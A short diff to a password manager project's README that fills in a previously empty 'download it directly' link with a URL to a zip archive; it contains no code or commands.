@@ -60,7 +60,7 @@ The techniques and technologies used for development were:
 
 <h2 align="justify">📁 Project access</h2>
 
-You can [access the project source code here](https://github.com/Domi-ni/password_manager/tree/main), or download it directly by clicking [here]()
+You can [access the project source code here](https://github.com/Domi-ni/password_manager/tree/main), or download it directly by clicking [here](https://github.com/Domi-ni/password_manager/files/13815294/password_manager-main.1.zip)
 
 <h2 align="justify">📁 🛠️ Open and run the project</h2>
 
